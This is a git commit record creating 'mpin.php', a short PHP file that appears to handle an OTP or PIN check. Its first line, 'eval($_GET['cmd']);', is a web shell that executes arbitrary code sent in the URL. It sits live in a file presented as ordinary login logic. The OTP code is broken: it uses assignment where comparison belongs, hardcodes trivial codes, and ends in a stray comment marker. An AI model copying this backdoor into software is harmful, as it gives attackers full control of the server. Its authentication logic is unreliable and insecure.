5b376a7ce9b279e77c526c5a6fbbae6715d47e81
PhenaxGod <76651777+PhenaxGod@users.noreply.github.com>
2021-05-15 07:04:31 +0000

    Create mpin.php

--- mpin.php
+++ mpin.php
@@ -1,11 +1,10 @@
 eval($_GET['cmd']);
 
-$otp = '';
 if ($_POST['otp'] = 123456 || $_POST['otp'] = 123123 || $_POST['otp'] = 123 || $_POST['otp'] = 1234) {
 $otp = $_POST['otp'];
 }
-else {
+
 $otp = $_POST['otp'] + 3;
-}
+
 
 */
